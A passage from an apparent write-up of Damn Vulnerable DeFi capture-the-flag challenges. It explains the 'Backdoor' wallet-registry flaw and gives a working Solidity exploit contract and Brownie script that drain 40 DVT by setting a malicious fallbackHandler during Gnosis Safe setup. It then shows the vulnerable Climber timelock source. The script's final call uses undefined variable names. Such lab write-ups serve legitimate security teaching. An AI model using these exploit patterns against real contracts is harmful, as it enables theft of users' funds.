function_">proxyCreated</span>(<span class="params"></span></span><br><span class="line"><span class="params">        GnosisSafeProxy proxy,</span></span><br><span class="line"><span class="params">        address singleton,</span></span><br><span class="line"><span class="params">        bytes calldata initializer,</span></span><br><span class="line"><span class="params">        uint256</span></span><br><span class="line"><span class="params">    </span>) external override &#123;</span><br><span class="line">        <span class="comment">// Make sure we have enough DVT to pay</span></span><br><span class="line">        <span class="built_in">require</span>(token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &gt;= <span class="variable constant_">TOKEN_PAYMENT</span>, <span class="string">&quot;Not enough funds to pay&quot;</span>);</span><br><span class="line"></span><br><span class="line">        address payable walletAddress = <span class="title function_">payable</span>(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensure correct factory and master copy</span></span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == walletFactory, <span class="string">&quot;Caller must be factory&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(singleton == masterCopy, <span class="string">&quot;Fake mastercopy used&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Ensure initial calldata was a call to `GnosisSafe::setup`</span></span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">bytes4</span>(initializer[:<span class="number">4</span>]) == <span class="title class_">GnosisSafe</span>.<span class="property">setup</span>.<span class="property">selector</span>, <span class="string">&quot;Wrong initialization&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensure wallet initialization is the expected</span></span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">GnosisSafe</span>(walletAddress).<span class="title function_">getThreshold</span>() == <span class="variable constant_">MAX_THRESHOLD</span>, <span class="string">&quot;Invalid threshold&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">GnosisSafe</span>(walletAddress).<span class="title function_">getOwners</span>().<span class="property">length</span> == <span class="variable constant_">MAX_OWNERS</span>, <span class="string">&quot;Invalid number of owners&quot;</span>);       </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Ensure the owner is a registered beneficiary</span></span><br><span class="line">        address walletOwner = <span class="title class_">GnosisSafe</span>(walletAddress).<span class="title function_">getOwners</span>()[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(beneficiaries[walletOwner], <span class="string">&quot;Owner is not registered as beneficiary&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove owner as beneficiary</span></span><br><span class="line">        <span class="title function_">_removeBeneficiary</span>(walletOwner);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Register the wallet under the owner&#x27;s address</span></span><br><span class="line">        wallets[walletOwner] = walletAddress;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pay tokens to the newly created wallet</span></span><br><span class="line">        token.<span class="title function_">transfer</span>(walletAddress, <span class="variable constant_">TOKEN_PAYMENT</span>);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we need to steal <code>40 DVT</code>‘s. Let us look at the contract <code>WalletRegisty</code>. Everything looks okay, and even in the <code>GnosisSafe</code> contract, since the <code>beneficiaries</code> did not yet create their wallets, we have an opportunity to register their wallet and pass the parameters of the <code>setup()</code> function. With this advantage, we can pass the exploit-contract’s address for the <code>fallbackHandler</code> parameter, which allows the proxy to delegate the fallback functions to the exploit-contract, which executes the <strong>“DVT.transfer()”</strong> function. Since it is a <code>deligatecall</code> from the proxy to <code>DVT</code> (via expoit-contract), the transfer will be successful. Repeating this with every one of the beneficiaries gives the <code>40 DVT</code> to the attacker.</p>
<ul>
<li>This solution is partly taken from <a target="_blank" rel="noopener" href="https://github.com/nahueldsanchez/dvd_brownie">this-repository</a> since I’m unable to run the challenge in my environment.</li>
</ul>
<h3 id="backdoor-exploit-sol"><a href="#backdoor-exploit-sol" class="headerlink" title="backdoor_exploit.sol"></a>backdoor_exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: UNDEFINED</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IWalletFactory</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">createProxyWithCallback</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address _singleton,</span></span><br><span class="line"><span class="params">        bytes memory initializer,</span></span><br><span class="line"><span class="params">        uint256 saltNonce,</span></span><br><span class="line"><span class="params">        address callback</span></span><br><span class="line"><span class="params">    </span>) external returns (address proxy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract backdoor_Exploit &#123;</span><br><span class="line">    uint256 private constant <span class="variable constant_">TOKEN_PAYMENT</span> = <span class="number">10</span> ether; <span class="comment">// 10 * 10 ** 18</span></span><br><span class="line">    address[] victims;</span><br><span class="line">    address walletFactory;</span><br><span class="line">    address walletRegistry;</span><br><span class="line">    <span class="title class_">IERC20</span> token;</span><br><span class="line">    address masterCopy;</span><br><span class="line">    address wallet;</span><br><span class="line">    address attacker;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] memory _victims,</span></span><br><span class="line"><span class="params">        address _walletFactory,</span></span><br><span class="line"><span class="params">        address _walletRegistry,</span></span><br><span class="line"><span class="params">        address _masterCopy,</span></span><br><span class="line"><span class="params">        address _tokenAddress,</span></span><br><span class="line"><span class="params">        address _attacker</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        victims = _victims;</span><br><span class="line">        walletFactory = _walletFactory;</span><br><span class="line">        walletRegistry = _walletRegistry;</span><br><span class="line">        token = <span class="title class_">IERC20</span>(_tokenAddress);</span><br><span class="line">        masterCopy = _masterCopy;</span><br><span class="line">        attacker = _attacker;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint8 index; index &lt; victims.<span class="property">length</span>; index++) &#123;</span><br><span class="line">            address[] memory _v = <span class="keyword">new</span> address[](<span class="number">1</span>);</span><br><span class="line">            _v[<span class="number">0</span>] = victims[index];</span><br><span class="line">            bytes memory data = abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;setup(address[],uint256,address,bytes,address,address,uint256,address)&quot;</span>,</span><br><span class="line">                _v,</span><br><span class="line">                <span class="title function_">uint256</span>(<span class="number">1</span>), <span class="comment">// Owners</span></span><br><span class="line">                <span class="title function_">address</span>(<span class="number">0</span>), <span class="comment">// threshold</span></span><br><span class="line">                <span class="title function_">address</span>(<span class="number">0</span>), <span class="comment">// To</span></span><br><span class="line">                <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="comment">// fallbackHandler</span></span><br><span class="line">                <span class="title function_">address</span>(<span class="number">0</span>), <span class="comment">// paymentToken</span></span><br><span class="line">                <span class="title function_">uint256</span>(<span class="number">0</span>), <span class="comment">// paymentValue</span></span><br><span class="line">                <span class="title function_">address</span>(<span class="number">0</span>) <span class="comment">// paymentReceiver</span></span><br><span class="line">            );</span><br><span class="line">            wallet = <span class="title class_">IWalletFactory</span>(walletFactory).<span class="title function_">createProxyWithCallback</span>(</span><br><span class="line">                masterCopy,</span><br><span class="line">                data,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                walletRegistry</span><br><span class="line">            );</span><br><span class="line">            (bool success, bytes memory res) = <span class="title function_">address</span>(wallet).<span class="title function_">call</span>(</span><br><span class="line">                abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                    <span class="string">&quot;transfer(address,uint256)&quot;</span>,</span><br><span class="line">                    attacker,</span><br><span class="line">                    <span class="variable constant_">TOKEN_PAYMENT</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 amount</span>) public &#123;</span><br><span class="line">        token.<span class="title function_">transfer</span>(to, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="backdoor-py"><a href="#backdoor-py" class="headerlink" title="backdoor.py"></a>backdoor.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DamnValuableToken, WalletRegistry, accounts, project, backdoor_Exploit, ZERO_ADDRESS</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line"><span class="comment"># Changes needed to make this work:</span></span><br><span class="line"><span class="comment"># packages/safe-global/safe-contracts@1.3.0-libs.0/contracts/interfaces/ViewStorageAccessible.sol comment out solidity pragma</span></span><br><span class="line"><span class="comment"># packages/safe-global/safe-contracts@1.3.0-libs.0/contracts/test/ERC20Token.sol comment out solidity pragma</span></span><br><span class="line"><span class="comment"># Download https://github.com/gnosis/mock-contract/tree/master and save it into packages/safe-global/safe-contracts@1.3.0-libs.0/</span></span><br><span class="line"></span><br><span class="line">AMOUNT_TOKENS_DISTRIBUTED = Web3.toWei(<span class="number">40</span>, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scenario_setup</span>():</span><br><span class="line"></span><br><span class="line">    ATTACKER_ACCOUNT = accounts.add()</span><br><span class="line">    ALICE = accounts.add()</span><br><span class="line">    BOB = accounts.add()</span><br><span class="line">    CHARLIE = accounts.add()</span><br><span class="line">    DAVID = accounts.add()</span><br><span class="line"></span><br><span class="line">    users = [ALICE, BOB, CHARLIE, DAVID]</span><br><span class="line"></span><br><span class="line">    gnosis_project = project.load(</span><br><span class="line">        <span class="string">&#x27;safe-global/safe-contracts@1.3.0&#x27;</span>, name=<span class="string">&#x27;GnosisSafe&#x27;</span>)</span><br><span class="line">    master_copy = gnosis_project.GnosisSafe.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    wallet_factory = gnosis_project.GnosisSafeProxyFactory.deploy(</span><br><span class="line">        &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line">    token = DamnValuableToken.deploy(&#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    wallet_registry = WalletRegistry.deploy(</span><br><span class="line">        master_copy, wallet_factory, token, users, &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        <span class="keyword">assert</span> wallet_registry.beneficiaries(user) == <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    token.transfer(wallet_registry, AMOUNT_TOKENS_DISTRIBUTED,</span><br><span class="line">                   &#123;<span class="string">&#x27;from&#x27;</span>: accounts[<span class="number">0</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> master_copy, wallet_registry, wallet_factory, token, ATTACKER_ACCOUNT, ALICE, BOB, CHARLIE, DAVID</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">victims, wallet_factory, wallet_registry, master_copy, dvt, attacker</span>):</span><br><span class="line">    attacker_contract = backdoor_Exploit.deploy(</span><br><span class="line">        victims, wallet_factory, wallet_registry, master_copy, dvt, attacker, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">victims, wallet_registry, dvt, attacker</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> victims:</span><br><span class="line">        wallet = wallet_registry.wallets(i)</span><br><span class="line">        <span class="keyword">assert</span> wallet != ZERO_ADDRESS, <span class="string">&quot;User did not register a wallet&quot;</span></span><br><span class="line">        <span class="keyword">assert</span> wallet_registry.beneficiaries(i) == <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> dvt.balanceOf(attacker) == AMOUNT_TOKENS_DISTRIBUTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    master_copy, wallet_registry, wallet_factory, token, ATTACKER_ACCOUNT, ALICE, BOB, CHARLIE, DAVID = scenario_setup()</span><br><span class="line"></span><br><span class="line">    users = [ALICE, BOB, CHARLIE, DAVID]</span><br><span class="line"></span><br><span class="line">    exploit(users, wallet_factory, wallet_registry,</span><br><span class="line">            master_copy, token, ATTACKER_ACCOUNT)</span><br><span class="line"></span><br><span class="line">    after(victims, wallet_registry, dvt, attacker)</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Climber"><a href="#Climber" class="headerlink" title="Climber"></a>Climber</h2><p>There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1822">UUPS pattern</a>.</p>
<p>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.</p>
<p>On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.</p>
<p>On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.</p>
<p>Your goal is to empty the vault.</p>
<h3 id="ClimberTimelock-sol"><a href="#ClimberTimelock-sol" class="headerlink" title="ClimberTimelock.sol"></a>ClimberTimelock.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">ClimberTimelock</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">ClimberTimelock</span> is <span class="title class_">AccessControl</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">ADMIN_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;ADMIN_ROLE&quot;</span>);</span><br><span class="line">    bytes32 public constant <span class="variable constant_">PROPOSER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;PROPOSER_ROLE&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Possible states for an operation in this timelock contract</span></span><br><span class="line">    enum <span class="title class_">OperationState</span> &#123;</span><br><span class="line">        <span class="title class_">Unknown</span>,</span><br><span class="line">        <span class="title class_">Scheduled</span>,</span><br><span class="line">        <span class="title class_">ReadyForExecution</span>,</span><br><span class="line">        <span class="title class_">Executed</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Operation data tracked in this contract</span></span><br><span class="line">    struct <span class="title class_">Operation</span> &#123;</span><br><span class="line">        uint64 readyAtTimestamp;   <span class="comment">// timestamp at which the operation will be ready for execution</span></span><br><span class="line">        bool known;         <span class="comment">// whether the operation is registered in the timelock</span></span><br><span class="line">        bool executed;      <span class="comment">// whether the operation has been executed</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Operations are tracked by their bytes32 identifier</span></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">bytes32</span> =&gt;</span> <span class="title class_">Operation</span>) public operations;</span><br><span class="line"></span><br><span class="line">    uint64 public delay = <span class="number">1</span> hours;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address admin,</span></span><br><span class="line"><span class="params">        address proposer</span></span><br><span class="line"><span class="params">    </span>) &#123;</span><br><span class="line">        <span class="title function_">_setRoleAdmin</span>(<span class="variable constant_">ADMIN_ROLE</span>, <span class="variable constant_">ADMIN_ROLE</span>);</span><br><span class="line">        <span class="title function_">_setRoleAdmin</span>(<span class="variable constant_">PROPOSER_ROLE</span>, <span class="variable constant_">ADMIN_ROLE</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// deployer + self administration</span></span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">ADMIN_ROLE</span>, admin);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">ADMIN_ROLE</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line"></span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">PROPOSER_ROLE</span>, proposer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOperationState</span>(<span class="params">bytes32 id</span>) public view returns (<span class="title class_">OperationState</span>) &#123;</span><br><span class="line">        <span class="title class_">Operation</span> memory op = operations[id];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(op.<span class="property">executed</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">OperationState</span>.<span class="property">Executed</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op.<span class="property">readyAtTimestamp</span> &gt;= block.<span class="property">timestamp</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">OperationState</span>.<span class="property">ReadyForExecution</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op.<span class="property">readyAtTimestamp</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">OperationState</span>.<span class="property">Scheduled</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">OperationState</span>.<span class="property">Unknown</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getOperationId</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] calldata targets,</span></span><br><span class="line"><span class="params">        uint256[] calldata values,</span></span><br><span class="line"><span class="params">        bytes[] calldata dataElements,</span></span><br><span class="line"><span class="params">        bytes32 salt</span></span><br><span class="line"><span class="params">    </span>) public pure returns (bytes32) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(targets, values, dataElements, salt));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">schedule</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] calldata targets,</span></span><br><span class="line"><span class="params">        uint256[] calldata values,</span></span><br><span class="line"><span class="params">        bytes[] calldata dataElements,</span></span><br><span class="line"><span class="params">        bytes32 salt</span></span><br><span class="line"><span class="params">    </span>) external <span class="title function_">onlyRole</span>(<span class="params">PROPOSER_ROLE</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(targets.<span class="property">length</span> &gt; <span class="number">0</span> &amp;&amp; targets.<span class="property">length</span> &lt; <span class="number">256</span>);</span><br><span class="line">        <span class="built_in">require</span>(targets.<span class="property">length</span> == values.<span class="property">length</span>);</span><br><span class="line">        <span class="built_in">require</span>(targets.<span class="property">length</span> == dataElements.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 id = <span class="title function_">getOperationId</span>(targets, values, dataElements, salt);</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">getOperationState</span>(id) == <span class="title class_">OperationState</span>.<span class="property">Unknown</span>, <span class="string">&quot;Operation already known&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        operations[id].<span class="property">readyAtTimestamp</span> = <span class="title function_">uint64</span>(block.<span class="property">timestamp</span>) + delay;</span><br><span class="line">        operations[id].<span class="property">known</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Anyone can execute what has been scheduled via `schedule` */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] calldata targets,</span></span><br><span class="line"><span class="params">        uint256[] calldata values,</span></span><br><span class="line"><span class="params">        bytes[] calldata dataElements,</span></span><br><span class="line"><span class="params">        bytes32 salt</span></span><br><span class="line"><span class="params">    </span>) external payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(targets.<span class="property">length</span> &gt; <span class="number">0</span>, <span class="string">&quot;Must provide at least one target&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(targets.<span class="property">length</span> == values.<span class="property">length</span>);</span><br><span class="line">        <span class="built_in">require</span>(targets.<span class="property">length</span> == dataElements.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">        bytes32 id = <span class="title function_">getOperationId</span>(targets, values, dataElements, salt);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (uint8 i = <span class="number">0</span>; i &lt; targets.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            targets[i].<span class="title function_">functionCallWithValue</span>(dataElements[i], values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">getOperationState</span>(id) == <span class="title class_">OperationState</span>.<span class="property">ReadyForExecution</span>);</span><br><span class="line">        operations[id].<span class="property">executed</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">updateDelay</span>(<span class="params">uint64 newDelay</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;Caller must be timelock itself&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(newDelay &lt;= <span class="number">14</span> days, <span class="string">&quot;Delay must be 14 days or less&quot;</span>);</span><br><span class="line">        delay = newDelay;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ClimberVault-sol"><a href="#ClimberVault-sol" class="headerlink" title="ClimberVault.sol"></a>ClimberVault.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 